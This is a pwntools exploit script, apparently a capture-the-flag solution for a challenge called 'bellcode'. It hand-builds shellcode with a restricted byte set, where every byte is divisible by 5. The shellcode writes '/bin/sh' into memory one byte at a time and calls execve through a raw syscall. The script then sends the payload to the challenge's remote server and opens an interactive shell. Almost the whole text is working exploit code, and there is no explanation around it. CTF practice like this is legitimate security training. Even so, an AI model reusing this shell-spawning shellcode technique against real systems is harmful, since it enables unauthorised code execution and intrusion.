from pwn import *

elf = context.binary = ELF('./bellcode',checksec=False)
p = elf.process()

shellcode = asm(

# craft rdx = 0x0
'''
push rax
pop rdx
''' +


# craft rsi = 0x0
'''
xchg esi,eax
'''+


# craft bin sh
'''
// mov rax to 0x0 (r14 has the value 0)
xchg eax,r14d

// 0x2f - /
dec eax
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xd2
dec eax
dec eax
dec eax

push rbp
pop rdi
stos   BYTE PTR es:[rdi],al

// 62 - b
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xd2
stos   BYTE PTR es:[rdi], al

// 69 - i
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xfa
dec eax
dec eax
dec eax
dec eax
stos   BYTE PTR es:[rdi], al

// 6e - n
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xfa
dec eax
dec eax
dec eax
dec eax
dec eax
dec eax
stos   BYTE PTR es:[rdi], al

// 2f - /
dec eax
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
'''+'''
dec eax
'''*68 +'''
stos   BYTE PTR es:[rdi], al

// 73 - s
dec eax
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xbe
dec eax
dec eax
stos   BYTE PTR es:[rdi], al


// 68 - h
dec eax
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xbe
'''+'''
dec eax
'''*81+'''
stos   BYTE PTR es:[rdi], al

push rbp
pop rdi
'''+

# set rax to 0x3b
'''
dec eax
'''*45 +

### Everything is set, make a syscall!!!
'''
syscall
'''
)

print(disasm(shellcode))

# check
for byte in shellcode:
	if byte % 5:
		log.critical(f'invalid byte {hex(byte)}')
		exit()

# p.interactive('OPEN GDB ')

p = remote('bellcode.chal.imaginaryctf.org',1337)
p.sendline(shellcode)
p.interactive()
